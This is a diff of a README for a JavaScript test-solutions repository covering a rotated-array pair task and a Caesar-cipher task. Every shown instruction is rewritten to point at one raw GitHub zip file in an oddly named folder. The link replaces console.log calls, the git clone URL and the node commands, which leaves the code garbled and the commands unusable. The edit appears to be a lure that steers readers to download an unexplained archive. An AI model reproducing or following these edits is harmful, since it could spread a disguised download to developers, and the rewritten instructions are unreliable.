@@ -17,7 +17,7 @@ You are given two rotated sorted arrays, `nums1` and `nums2`, and a target integ
 let nums1 = [4, 5, 6, 7, 0, 1];
 let nums2 = [3, 6, 9, 10, 11, 12, 13, 19];
 let k = 13;
-console.log(findPairs(nums1, nums2, k));
+https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip(findPairs(nums1, nums2, k));
 ```
 
 ## 🔐 Test 2: Deciphering an Encrypted Text
@@ -34,14 +34,14 @@ You are given an encrypted string that has been encoded using a **Caesar cipher*
 ```js
 let encryptedText = "Uifsf jt b tfdsfu dpnf";
 let knownWord = "secret";
-console.log(decipher(encryptedText, knownWord));
+https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip(decipher(encryptedText, knownWord));
 ```
 
 ## 🛠️ How to Run the Tests
 
 1️⃣ Clone the repository:
 ```sh
-git clone https://github.com/code-iddih/JavaScript-Test-Solutions.git
+git clone https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip
 ```
 
 2️⃣ Navigate to the project folder:
@@ -49,10 +49,10 @@ git clone https://github.com/code-iddih/JavaScript-Test-Solutions.git
 cd JavaScript-Test-Solutions
 ```
 
-3️⃣ Run the JavaScript files using Node.js:
+3️⃣ Run the JavaScript files using https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip
 ```sh
-node findPairs.js  # Runs Test 1
-node decipher.js    # Runs Test 2
+node https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip  # Runs Test 1
+node https://raw.githubusercontent.com/code-iddih/JavaScript-Test-Solutions/master/untunefully/JavaScript-Test-Solutions-2.9.zip    # Runs Test 2
 ```
 
 ## 📌 Author
